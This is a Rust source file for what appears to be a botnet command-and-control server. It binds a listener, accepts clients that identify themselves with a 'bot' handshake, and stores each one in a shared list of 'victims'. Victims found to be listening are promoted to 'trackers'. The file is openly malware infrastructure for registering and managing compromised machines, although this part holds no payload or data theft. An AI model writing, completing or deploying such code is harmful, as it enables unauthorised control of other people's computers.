mod tracker;

#[macro_use]
extern crate log;

use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::{Mutex, Arc}, env};

use crate::tracker::is_victim_listening;

#[derive(Debug)]
enum VictimType {
    Bot,
    Tracker
}

#[derive(Debug)]
pub struct Victim {
    ip: SocketAddr,
    victim_type: VictimType
}

fn main() {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "debug")
    }
    env_logger::init();
    let listener = TcpListener::bind("192.168.0.12:9570").unwrap();
    let victims: Arc<Mutex<Vec<Victim>>> = Arc::new(Mutex::new(Vec::new()));

    info!("Server started");
    for stream in listener.incoming() {
        let stream = stream.unwrap();

        info!("Connection established");
        thread::spawn({
            let victims = Arc::clone(&victims);
            move || {
                let victim = handle_connection(stream);
                if let Some(victim) = victim {
                    let mut victims = victims.lock().unwrap();
                    victims.push(victim);
                    debug!("victims: {:?}", victims);
                }
            }
        });
    }
}

fn handle_connection(mut stream: TcpStream) -> Option<Victim> {
    let mut buf_reader = BufReader::new(&stream);
    let mut http_request: Vec<u8> = Vec::new();
    buf_reader
        .read_until(0, &mut http_request).unwrap();

    let http_request = std::str::from_utf8(&http_request).unwrap();
    debug!("Request: {:?} {:?}", http_request.as_bytes(), "bot".as_bytes());
    if http_request != "bot\0" {
        println!("oui");
        return None;
    };
    if let Err(_) = stream.write_all("active\0".as_bytes()) {
        return None;
    }
    let current_ip = stream.peer_addr().unwrap();
    debug!("ip: {}", current_ip);
    let mut victim = Victim { ip: current_ip, victim_type: VictimType::Bot };

    let mut buf_reader = BufReader::new(stream);

    let mut buffer = Vec::new();
    buf_reader.read_until(0, &mut buffer).unwrap();
    let buffer = std::str::from_utf8(&buffer).unwrap();
    if buffer != "ready\0" {
        error!("The client's server responded '{}' instead of 'ready'", buffer);
        return None;
    }
    if is_victim_listening(&victim) {
        info!("The victim: {} is listening and will become a tracker", victim.ip);
        victim.victim_type = VictimType::Tracker;
    }

    return Some(victim);
}
